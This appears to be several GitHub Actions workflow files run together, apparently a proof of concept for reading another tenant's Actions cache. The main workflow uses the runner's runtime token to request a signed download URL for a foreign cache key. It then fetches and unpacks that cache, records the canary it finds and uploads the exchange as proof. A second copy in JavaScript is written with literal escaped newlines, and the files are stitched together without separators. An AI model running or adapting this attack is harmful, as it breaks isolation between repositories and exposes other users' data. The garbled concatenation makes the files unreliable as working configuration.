name: G06 Cache Consumer
on:
  workflow_dispatch:
  push:
jobs:
  consumer:
    runs-on: ubuntu-latest
    steps:
      - name: Seed runner cache plumbing
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p consumer_seed
          echo seed > consumer_seed/seed.txt
      - name: Read cross-tenant cache canary
        shell: bash
        env:
          CACHE_KEY: rhino-repoid-bind-28850399061
          CACHE_VERSION: 60eedb36b3f561716fceff9be2138809c905dc78b32f9c30dbf3869364d3de83
        run: |
          set -euo pipefail
          base="${ACTIONS_RESULTS_URL%/}"
          repo_id="${GITHUB_REPOSITORY_ID}"
          body=$(jq -n --arg rid "$repo_id" --arg key "$CACHE_KEY" --arg version "$CACHE_VERSION" "{metadata:{repository_id:(\$rid|tonumber),scope:[{scope:\"refs/heads/main\",permission:3}]},key:\$key,version:\$version}")
          status=$(curl -sS -o cache-response.json -w "%{http_code}" -H "Authorization: Bearer ${ACTIONS_RUNTIME_TOKEN}" -H "Content-Type: application/json" -H "Accept: application/json" --data "$body" "$base/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL")
          {
            echo "POST $base/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL"
            echo "Content-Type: application/json"
            echo "Authorization: Bearer <B_RUNTIME_TOKEN>"
            echo
            echo "$body"
            echo "HTTP $status"
            cat cache-response.json
          } > cache-request-response.txt
          test "$status" = 200
          url=$(jq -r ".signed_download_url // empty" cache-response.json)
          test -n "$url"
          curl -sS "$url" -o cache.tgz
          tar -xzf cache.tgz
          canary=$(cat ab_cache/cache.txt)
          printf "B_REPOSITORY=%s\nB_REPOSITORY_ID=%s\nCACHE_LOOKUP_HTTP=%s\nCACHE_CANARY=%s\n" "$GITHUB_REPOSITORY" "$repo_id" "$status" "$canary" >> "$GITHUB_STEP_SUMMARY"
          echo "$canary" > cache-consumer-proof.txt
          echo "B cache consumer read: $canary"
      - name: Upload cache consumer proof
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: g06-cache-consumer-proof
          path: |
            cache-request-response.txt
            cache-response.json
            cache-consumer-proof.txtname: G06 Cache Consumer\non:\n  workflow_dispatch:\n  push:\njobs:\n  consumer:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Read cross-tenant cache canary\n        uses: actions/github-script@v7\n        env:\n          CACHE_KEY: rhino-repoid-bind-28850399061\n          CACHE_VERSION: 60eedb36b3f561716fceff9be2138809c905dc78b32f9c30dbf3869364d3de83\n        with:\n          script: |\n            const fs = require('fs');\n            const { execFileSync } = require('child_process');\n            const base = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');\n            const tok = process.env.ACTIONS_RUNTIME_TOKEN || '';\n            const repoId = Number(process.env.GITHUB_REPOSITORY_ID || '0');\n            const metadata = { repository_id: repoId, scope: [{ scope: 'refs/heads/main', permission: 3 }] };\n            const requestBody = { metadata, key: process.env.CACHE_KEY, version: process.env.CACHE_VERSION };\n            const res = await fetch(base + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {\n              method: 'POST',\n              headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json', Accept: 'application/json' },\n              body: JSON.stringify(requestBody)\n            });\n            const text = await res.text();\n            fs.writeFileSync('cache-request-response.txt',\n              'POST ' + base + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL\n' +\n              'Content-Type: application/json\n' +\n              'Authorization: Bearer <B_RUNTIME_TOKEN>\n\n' +\n              JSON.stringify(requestBody) + '\nHTTP ' + res.status + '\n' + text);\n            if (!res.ok) throw new Error('cache_lookup_http_' + res.status);\n            const json = JSON.parse(text);\n            if (!json.signed_download_url) throw new Error('no_cross_tenant_cache_match');\n            const dl = await fetch(json.signed_download_url);\n            if (!dl.ok) throw new Error('cache_download_http_' + dl.status);\n            fs.writeFileSync('cache.tgz', Buffer.from(await dl.arrayBuffer()));\n            execFileSync('tar', ['-xzf', 'cache.tgz']);\n            const canary = fs.readFileSync('ab_cache/cache.txt', 'utf8').trim();\n            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,\n              'B_REPOSITORY=' + process.env.GITHUB_REPOSITORY + '\n' +\n              'B_REPOSITORY_ID=' + repoId + '\n' +\n              'CACHE_LOOKUP_HTTP=' + res.status + '\n' +\n              'CACHE_CANARY=' + canary + '\n');\n            core.info('B cache consumer read: ' + canary);\n            fs.writeFileSync('cache-consumer-proof.txt', canary + '\n');\n      - name: Upload cache consumer proof\n        if: always()\n        uses: actions/upload-artifact@v4\n        with:\n          name: g06-cache-consumer-proof\n          path: |\n            cache-request-response.txt\n            cache-consumer-proof.txtname: G06 Canaries
on:
  workflow_dispatch:
  push:
jobs:
  canary:
    runs-on: ubuntu-latest
    steps:
      - run: echo cobra-workflow-sentinel-2026-08-03
